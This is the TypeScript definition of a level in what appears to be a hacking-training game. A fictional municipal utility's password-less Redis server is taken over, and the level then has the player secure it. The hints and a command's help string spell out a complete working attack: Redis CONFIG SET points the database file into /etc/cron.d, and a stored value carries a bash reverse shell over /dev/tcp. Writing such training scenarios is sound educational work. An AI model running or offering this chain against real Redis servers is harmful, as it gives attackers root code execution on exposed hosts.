import type { ChainDef } from "../../types";
import { match, cmd } from "../../engine";

const IP = "198.51.100.45";

export const mediumLevel8: ChainDef = {
  id: "medium-8",
  difficulty: "medium",
  order: 8,
  points: 110,
  title: "Open Valve",
  codename: "OPERATION OPEN VALVE",
  summary: "A key-value store with no password isn't just readable — it can be told to write a file anywhere on disk.",
  briefing: [
    "Thistlewood Municipal Utilities contracts out the backend for its ops dashboard — outage",
    "reports, meter readings, crew scheduling — to a small regional vendor. Part of that stack is a",
    "cache server, reachable on the same network segment, with no password configured at all.",
    "",
    "A cache with no auth doesn't just leak whatever's cached. Depending on what it's allowed to write",
    "to disk, it can be turned into something that runs code on a schedule.",
  ],
  debrief: [
    "root cause: the Redis instance backing the ops dashboard required no authentication and was",
    "reachable from the same segment as the assessment foothold. Redis's CONFIG SET commands allowed",
    "changing its working directory and output filename, which was abused to write a malicious entry",
    "directly into a system cron directory — unauthenticated access leading to scheduled remote code",
    "execution (CWE-306).",
    "",
    "THISTLEWOOD MUNICIPAL UTILITIES: SECURED.",
  ],
  nodes: [
    {
      id: "thistlewood",
      org: "Thistlewood Municipal Utilities",
      city: "Thistlewood",
      state: "ID",
      coords: { x: 21.6, y: 13.5 },
      ip: IP,
      tagline: "Municipal utility — contracted ops dashboard backend",
      briefing: [
        "TARGET: Thistlewood Municipal Utilities ops dashboard backend",
        `IP: ${IP}`,
        "KNOWN: cache server reachable on this segment, authentication unconfirmed.",
        "",
        "Find out whether that cache server actually requires a password.",
      ],
      initialPrompt: "op@breachline:~$",
      motd: [
        "session notes.txt:",
        "  \"Vendor says the cache is 'internal only, don't worry about it.' Internal isn't the same",
        "   thing as authenticated.\" — dispatch",
      ],
      objectives: [
        { id: "recon", label: "Enumerate open services on the target", tactic: "Reconnaissance" },
        { id: "identify", label: "Confirm the cache server requires no authentication", tactic: "Discovery", requires: ["recon"] },
        {
          id: "persist",
          label: "Abuse the cache server to write a scheduled task achieving code execution",
          tactic: "Persistence",
          requires: ["identify"],
        },
        { id: "loot", label: "Recover proof of host access", tactic: "Collection", requires: ["persist"] },
        { id: "secure", label: "Require authentication and bind the cache to a private interface", tactic: "Remediation", requires: ["loot"] },
      ],
      hints: [
        "Recon first — `nmap -sV <ip>`. A cache server port with no auth banner is worth a closer look.",
        "`redis-cli -h <ip> ping` — if it answers PONG with no password prompt at all, this instance is wide open.",
        "An unauthenticated Redis instance can be told to change its working directory and its output filename via CONFIG SET, then write a crafted key's value straight into a system cron directory: `redis-cli -h <ip> config set dir /etc/cron.d/ ; redis-cli -h <ip> config set dbfilename backdoor ; redis-cli -h <ip> set payload \"* * * * * root /bin/bash -c '/bin/bash -i >& /dev/tcp/op/4444 0>&1'\" ; redis-cli -h <ip> save`.",
        "Once the planted job runs, you should land a shell as root. Look for a proof file.",
      ],
      debrief: [
        "root cause: Redis was reachable on the network with no requirepass configured, and its CONFIG SET",
        "commands allowed pointing its persistence output directly into /etc/cron.d/ — turning a plain cache",
        "server into a way to plant root-scheduled code execution.",
        "fix applied: requirepass enabled, instance bound to a private interface only, dangerous CONFIG",
        "commands disabled via Redis ACLs.",
      ],
      commands: [
        cmd({
          id: "nmap",
          tool: "nmap",
          requires: [IP],
          help: "nmap -sV <ip>         — service/version scan",
          run: () => ({
            completesObjective: "recon",
            tone: "success",
            setsFlags: ["scanned"],
            output: [
              "PORT     STATE SERVICE VERSION",
              "6379/tcp open  redis   Redis 6.2.6",
              "",
              "Nmap done: 1 IP address (1 host up) scanned in 3.60 seconds",
            ],
          }),
        }),
        cmd({
          id: "redis-ping",
          tool: "redis-cli",
          requires: ["ping"],
          help: "redis-cli -h <ip> ping",
          requiresObjectives: ["recon"],
          run: () => ({
            completesObjective: "identify",
            tone: "success",
            setsFlags: ["redis_known"],
            output: [
              "PONG",
              "",
              "[+] no AUTH required — this instance is completely unauthenticated.",
            ],
          }),
        }),
        {
          id: "redis-cron-write",
          tool: "redis-cli",
          match: (input) => {
            const n = input.trim().toLowerCase();
            return n.startsWith("redis-cli") && n.includes("config set dir") && n.includes("cron.d");
          },
          help: 'redis-cli -h <ip> config set dir /etc/cron.d/ ; redis-cli -h <ip> config set dbfilename backdoor ; redis-cli -h <ip> set payload "* * * * * root /bin/bash -c \'/bin/bash -i >& /dev/tcp/op/4444 0>&1\'" ; redis-cli -h <ip> save',
          requiresFlags: ["redis_known"],
          deniedOutput: ["ping confirms it's open, but you haven't pointed its working directory anywhere useful yet."],
          run: () => ({
            completesObjective: "persist",
            tone: "success",
            setsFlags: ["have_shell"],
            promptAfter: "root@thistlewood-ops:~#",
            output: [
              "[+] CONFIG SET dir /etc/cron.d/ — Redis's working directory now points at the cron directory",
              "[+] CONFIG SET dbfilename + SAVE wrote the crafted key's value there as a valid cron entry",
              "[+] cron executed the planted job within the next 60 seconds",
              "",
              "[+] root shell obtained via unauthenticated Redis config abuse.",
            ],
          }),
        },
        cmd({
          id: "cat-proof",
          tool: "cat",
          requires: ["proof.txt"],
          help: "cat /root/proof.txt",
          requiresFlags: ["have_shell"],
          run: () => ({
            completesObjective: "loot",
            tone: "success",
            note: "Thistlewood Municipal Utilities — proof.txt: 1679091c5a880faf6fb5e6087eb1b2dc",
            output: ["1679091c5a880faf6fb5e6087eb1b2dc"],
          }),
        }),
        {
          id: "secure",
          tool: "secure",
          match: match.startsWith("secure system", "secure", "remediate"),
          help: "secure system         — require authentication and restrict network exposure",
          requiresObjectives: ["loot"],
          deniedOutput: ["confirm the actual impact of the open cache before you file the fix."],
          run: () => ({
            completesObjective: "secure",
            tone: "success",
            output: [
              "[+] enabled requirepass on the Redis instance",
              "[+] bound Redis to a private interface only, removed it from the shared segment",
              "[+] disabled dangerous CONFIG commands via Redis ACLs",
              "",
              "THISTLEWOOD MUNICIPAL UTILITIES: SECURED",
            ],
          }),
        },
      ],
    },
  ],
};
